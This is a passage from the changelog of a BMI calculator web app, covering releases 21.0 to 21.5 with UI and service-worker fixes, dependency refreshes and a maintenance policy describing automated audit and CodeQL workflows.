- **Workflow rename** — `auto-update.yml` → `maintenance.yml` for ecosystem consistency. _(2e76156)_
- **Owner contact email** — obfuscated to deter scraping. _(5a7e0eb)_

### Chore

- Three weekly lockfile refreshes via the new maintenance workflow. _(fca70bd, 11dad7e, abce00e)_

---

## [21.5.0] — Stellar-v21.5

### Fixed

- **PWA false-positive update loop** — `v21.5` shipped a regression where the service-worker update detector repeatedly prompted users to refresh. Reworked the version-stability check so first-load false positives no longer fire. _(6280a95)_
- **Storage write ordering** — hardened the localStorage write sequence to prevent partial writes during tab teardown. _(1aa1d8f)_
- **PWA commit compare** — fixed a bug where comparing service-worker commits could miss an update when the byte length was identical but the hash differed. _(1aa1d8f)_
- **BMI null safety** — added explicit null guards in the BMI calculation pipeline to prevent `NaN` propagation when inputs are cleared mid-typing. _(1aa1d8f)_

### Changed

- **CI naming and author identity** — standardized workflow names and commit author identity for the maintenance bot. _(91a38a5)_
- **Security docs tightened** — refined the privacy boundary and scope sections in `SECURITY.md`. _(9e898a3)_

---

## [21.4.0] — Stellar-v21.4

### Changed

- **Rebrand to masters logo** — replaced the legacy `bmi-logo-masters.png` with a new 1254×1254 RGBA master asset, regenerated all derived sizes (128, 180, 192, 216, 256, 512, 512-maskable, 1024), and removed legacy asset files. _(84418e6, dd87777, 87f5dd0, 4005f15, 92667d6)_
- **Touch targets** — improved minimum tap-target sizes across the pager and form controls. _(84418e6)_

### Added

- **Trademark and branding guidelines** — introduced `TRADEMARK.md` and `BRANDING.md` governing name, logo, and color usage. _(0aa47ed, 8ac6387)_

### Chore

- Hardened direct dependency update flow, tightened workflow path filters, simplified `.gitignore`, normalized nightbot maintenance, prettier pass on `furthermore.md`. _(d5a2fed, 3c224e1, 4c0c12c, e245c9d, c7fd036, d76ad8a, afc4ff7, a404ad1)_

---

## [21.3.0] — Stellar-v21.3

### Added

- **Dormant maintenance guide** — introduced `DORMANT.md` as the canonical wake-up checklist for long quiet periods. _(4eed226)_
- **PWA audits hardened** — added `check-pwa-offline-shell.ts` and tightened the offline-shell verification gate. _(b6f9ae6)_

### Changed

- **Direct weekly maintenance** — switched the dependency-update workflow from PR-first to direct-commit (with read-only validation) to reduce friction. _(cc49e3a)_
- **License consolidation** — removed a stray `LICENSE.md` and consolidated on the GPL-3.0 `LICENSE` file. _(6c42435, 6216873)_

### Chore

- Six weekly dependency refreshes, multiple `chore(deps)` bumps. _(47b6b79, 8d2c438, c90cdb0, 4d60e3c, d3e6515, 98d12c8, ab72db0, 04276c8)_
- Misc refactors across utilities. _(8ad6554)_
- README logo alt-text and badges. _(ab72db0, 04276c8)_

---

## [21.2.0] — Stellar-v21.2

### Fixed

- **Mobile viewport edge** — polished layout overflow on small-width viewports. _(054eaa2)_
- **UX consistency cleanup** — visual pass across pager, gauge, and form. _(4108783)_

### Changed

- **Verify script robustness** — improved error reporting in the local verify script. _(ede7f50)_

### Chore

- Dependency update. _(321d13f)_

---

## [21.1.0] — Stellar-v21.1

### Fixed

- **Masterclass UI improvements** — multiple UX/UI consistency passes (v1–v4 iteration cycle). _(183bd03, 0eb237e, 588eb1f, 777e002)_
- **Notes feature** — small fixes for the in-app notes flow. _(222ae5d)_

---

## [21.0.0] — Stellar-v21.0

### Fixed

- **Service worker in dev preview** — fixed a bug where the service worker was incorrectly hooked in `vite dev`. _(62925f4)_
- **Accessibility / i18n / consistency** — critical pass on focus-visible contracts, universal unit symbols, removal of dead props, and documentation sync. _(31ca18b)_
- **ESLint formatting** — fixed formatting violations flagged by ESLint. _(46cdf7c)_
- **Twelve UX/UI consistency iterations** — comprehensive visual polish across all sections (v1 through v12). _(793412e, da9f1b3, 1cfdb30, eec297d, 0961987, da9f1b3, 06b1de8, 22c74fe)_

### Changed

- **Documentation masterclass rewrite** — rewrote all 5 core documentation files (README, BRANDING, SECURITY, TRADEMARK, furthermore) for accuracy and tone. _(4dfd3ec, bf622cd, bc72a10)_

### Chore

- Dependency update. _(508ed8f, 0299db1)_

---

## Maintenance Policy

This project follows a low-touch maintenance cadence. Between minor releases, automated workflows handle:

- **Weekly lockfile refresh** — `.github/workflows/maintenance.yml` runs `bun update --lockfile-only` every Sunday 03:00 UTC (10:00 WIB), validates the result against the full CI gate, then commits directly to `main`. The same workflow sweeps the Rust engine (night-frontier-Z6, `scripts/ci/sweep-rust-workspaces.sh`): `engine/argon2id/Cargo.lock` refreshes under a dependency-only diff and proves formatting, clippy strict, and wasm artifact parity before the bot commits it.
- **Weekly security audit** — `.github/workflows/security-audit.yml` runs `bun audit` + policy checks every Sunday 03:30 UTC (10:30 WIB), a deliberate 30-minute offset after the lockfile refresh so the audit sees the fresh `bun.lock` instead of racing it. A companion job scans the Rust engine lockfile with pinned cargo-audit (`--deny warnings`, observation-only).
- **Weekly supply-chain defense verdict** — `.github/workflows/axp1-znq.yml` (AXP1-ZnQ, night-solid-defense-1) chains off the dependency maintenance run: once the refreshed `bun.lock` is committed, the bot replays the maintenance remediation in an isolated scratch tree, re-audits it, and classifies every dangerous advisory by remediability — cleared by a compatible refresh = UPDATE-SOON (green with loud warnings), unfixable inside the pinned ranges or freshly pulled in by the refresh itself = CALL-OWNER (hard red). The verdict, the per-advisory classes, and remediation pointers land in the run summary; the engine self-tests its contract offline first (`bun run audit:axp1-znq --selftest`).
- **GitHub Action pin freshness** — the pre-commit advisory gate (`scripts/gates/check-actions-pins.sh`) re-reads every pin's freshness on each commit — silent when current, a named heal command when a pin is behind — and `scripts/ci/actions-version-sweep.sh --apply` heals on demand. The weekly server-side self-heal lane is retired; its standing Workflows-write PAT is exactly the credential the estate refuses to carry.
- **Weekly CodeQL** — `.github/workflows/codeql.yml` holds the Sunday 03:00 UTC (10:00 WIB) guardian anchor; the runtime-probe lane is retired (see [Unreleased]).

When waking the project after a dormant period, expect `bun audit` to flag advisories that were published in the interim — bump `overrides` in `package.json` (never weaken crypto deps) and re-run `./scripts/build.sh check-all`. Full guidance: [`DORMANT.md`](DORMANT.md).

---

_Link mapping: `[21.x.0]` sections correspond to the historic `Stellar-v21.x` tags; sections from the `v*` tag era onward match `package.json` directly. Commits referenced by short SHA can be inspected via `git show <sha>`._

## [Unreleased]

### Fixed

- **Internal research: night-cafe-7 — the invalid `--btn-bg` gradient stop repaired** _(6a2081a)_

### Changed

- **Internal research: night-cafe-7 — the dead CSS selectors removed** _(ee554e3)_
- **Internal research: night-cafe-7 — the transition scope narrowed on interactive surfaces** _(4f28df7)_
- **Internal research: night-cafe-7 — the base layer comment hygiene** _(bc0dc9b)_
